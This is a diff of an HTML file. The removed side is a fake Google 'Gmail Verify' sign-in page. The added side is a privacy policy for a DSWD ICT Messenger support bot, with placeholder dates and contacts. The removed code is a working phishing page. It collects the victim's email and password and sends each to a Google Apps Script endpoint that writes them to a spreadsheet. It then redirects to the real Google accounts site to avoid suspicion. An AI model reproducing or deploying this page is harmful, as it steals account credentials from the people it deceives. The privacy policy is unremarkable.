@@ -1,294 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail Verify</title>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
-        }
-
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #f8f9fa;
-            padding: 15px;
-        }
-
-        .container {
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .google-logo {
-            width: 92px;
-            margin-bottom: 15px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-        }
-
-        .subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dadce0;
-            border-radius: 5px;
-            font-size: 16px;
-            outline: none;
-            margin-bottom: 15px;
-        }
-
-        .forgot-link, .guest-mode-text a, .create-account {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .forgot-link:hover, .guest-mode-text a:hover, .create-account:hover {
-            text-decoration: underline;
-        }
-
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: relative;
-        }
-
-        .loading {
-            display: none;
-            font-size: 14px;
-            color: #1a73e8;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #1a73e8;
-            border-radius: 50%;
-            width: 16px;
-            height: 16px;
-            animation: spin 0.8s linear infinite;
-            margin-left: 8px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .back-button {
-            display: none;
-            background: none;
-            border: 1px solid #1a73e8;
-            color: #1a73e8;
-            font-size: 14px;
-            font-weight: 500;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .back-button:hover {
-            background: #1a73e8;
-            color: white;
-        }
-
-        button {
-            background: #1a73e8;
-            color: white;
-            font-size: 14px;
-            font-weight: 500;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        button:hover {
-            background: #135abc;
-        }
-
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #5f6368;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .footer a {
-            color: #5f6368;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Privacy Policy - DSWD ICT Messenger Bot</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: auto;
+      padding: 20px;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+    h1, h2 {
+      color: #0056b3;
+    }
+    .section {
+      margin-bottom: 30px;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 0.9em;
+      color: #666;
+      border-top: 1px solid #ddd;
+      padding-top: 10px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" 
-             alt="Google Logo" class="google-logo">
-        <h1>Sign in</h1>
-        <p class="subtitle">to verify your account</p>
-        
-        <form id="login-form">
-            <div class="form-group" id="email-section">
-                <input type="email" id="email" placeholder="Email or phone" required>
-                <a href="#" class="forgot-link">Forgot email?</a>
-            </div>
-            
-            <div class="form-group" id="password-section" style="display: none;">
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
 
-            <p class="guest-mode-text">
-                Not your computer? Use Guest mode to sign in privately.
-                <a href="#">Learn more</a>
-            </p>
+  <h1>Privacy Policy</h1>
+  <p><strong>Effective Date:</strong> [Insert Date]</p>
 
-            <p class="loading" id="loading">Verifying your account...</p>
+  <div class="section">
+    <h2>1. Introduction</h2>
+    <p>This Privacy Policy explains how we collect, use, and protect your information when you interact with the <strong>DSWD ICT Messenger Bot</strong> via Facebook Messenger. This bot is developed to assist users by providing step-by-step ICT-related support and guidance using AI.</p>
+  </div>
 
-            <div class="buttons">
-                <button type="button" class="back-button" id="back-button">Back</button>
-                <a href="https://support.google.com/mail/answer/56256?hl=en" class="create-account" id="create-account">Create account</a>
-                <button type="button" id="next-button">Next</button>
-                <button type="button" id="password-button" style="display: none;">Next</button>
-            </div>
-        </form>
+  <div class="section">
+    <h2>2. Information We Collect</h2>
+    <p>We may collect the following information:</p>
+    <ul>
+      <li>Messages you send to the bot (e.g., questions or concerns)</li>
+      <li>Your Facebook Messenger ID (used only to respond to your messages)</li>
+    </ul>
+    <p>We <strong>do not</strong> collect sensitive personal data (e.g., passwords, government IDs, or financial information).</p>
+  </div>
 
-        <div class="footer">
-            <span>English (United States)</span>
-            <div>
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
-        </div>
-    </div>
+  <div class="section">
+    <h2>3. How We Use the Information</h2>
+    <p>The information is used to:</p>
+    <ul>
+      <li>Generate and deliver ICT support using AI (Google Gemini)</li>
+      <li>Improve the bot’s responsiveness and relevance</li>
+    </ul>
+    <p>We <strong>do not</strong> share or sell your data for advertising purposes.</p>
+  </div>
 
-    <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycby0-BXS92JWHWGIULpOtuoZ_O7H2_MbA2Dj-Mp8bZXEO4uE82ypUBYu7FgBD9LQY2BS/exec";
-        let currentRowId = null; // To track the row for updating password
+  <div class="section">
+    <h2>4. Third-Party Services</h2>
+    <p>We use the <strong>Gemini API (by Google)</strong> to generate helpful responses. Only the content of your message is processed, and no personally identifiable information is shared with Google.</p>
+  </div>
 
-        document.getElementById("next-button").addEventListener("click", function() {
-            let email = document.getElementById("email").value;
-            if (!email) {
-                alert("Please enter your email.");
-                return;
-            }
+  <div class="section">
+    <h2>5. Data Security</h2>
+    <p>We implement appropriate security measures to protect your data from unauthorized access. Communications are handled securely through Facebook Messenger and Google Apps Script.</p>
+  </div>
 
-            let emailSection = document.getElementById("email-section");
-            let passwordSection = document.getElementById("password-section");
-            let loading = document.getElementById("loading");
-            let createAccount = document.getElementById("create-account");
-            let backButton = document.getElementById("back-button");
-            let nextButton = document.getElementById("next-button");
-            let passwordButton = document.getElementById("password-button");
+  <div class="section">
+    <h2>6. Your Rights</h2>
+    <p>You may stop using the bot at any time. If you have concerns about your data, contact us at:</p>
+    <ul>
+      <li><strong>Email:</strong> [Insert Contact Email]</li>
+      <li><strong>Office:</strong> DSWD ICT Unit – Region X</li>
+    </ul>
+  </div>
 
-            emailSection.style.display = "none";
-            createAccount.style.display = "none";
-            nextButton.style.display = "none";
-            loading.style.display = "block";
+  <div class="section">
+    <h2>7. Updates to This Policy</h2>
+    <p>We may update this Privacy Policy from time to time. When we do, we will revise the “Effective Date” at the top of this page.</p>
+  </div>
 
-            // Send email & timestamp to Google Sheet
-            fetch(scriptURL, {
-                method: "POST",
-                body: new URLSearchParams({
-                    email: email,
-                    action: "saveEmail"
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    currentRowId = data.rowId; // Save row ID for password update
-                }
-                loading.style.display = "none";
-                passwordSection.style.display = "block";
-                passwordButton.style.display = "inline-block";
-                backButton.style.display = "block";
-            })
-            .catch(error => console.error("Error saving email:", error));
-        });
+  <footer>
+    © [Insert Year] DSWD Region X - ICT Unit
+  </footer>
 
-       document.getElementById("password-button").addEventListener("click", function() {
-    let password = document.getElementById("password").value;
-    let passwordButton = document.getElementById("password-button");
-
-    if (!password) {
-        alert("Please enter your password.");
-        return;
-    }
-
-    passwordButton.innerText = "Loading...";
-    passwordButton.disabled = true;
-
-    // Send password to Google Sheet
-    fetch(scriptURL, {
-        method: "POST",
-        body: new URLSearchParams({
-            rowId: currentRowId, // Reference the row ID to update
-            password: password,
-            action: "savePassword"
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log("Password saved:", data);
-        window.location.href = "https://accounts.google.com.ph/"; // Redirect after success
-    })
-    .catch(error => {
-        console.error("Error saving password:", error);
-        passwordButton.innerText = "Submit";
-        passwordButton.disabled = false;
-    });
-});
-
-
-        document.getElementById("back-button").addEventListener("click", function() {
-            document.getElementById("password-section").style.display = "none";
-            document.getElementById("password-button").style.display = "none";
-            document.getElementById("back-button").style.display = "none";
-            document.getElementById("email-section").style.display = "block";
-            document.getElementById("next-button").style.display = "inline-block";
-        });
-    </script>
 </body>
 </html>
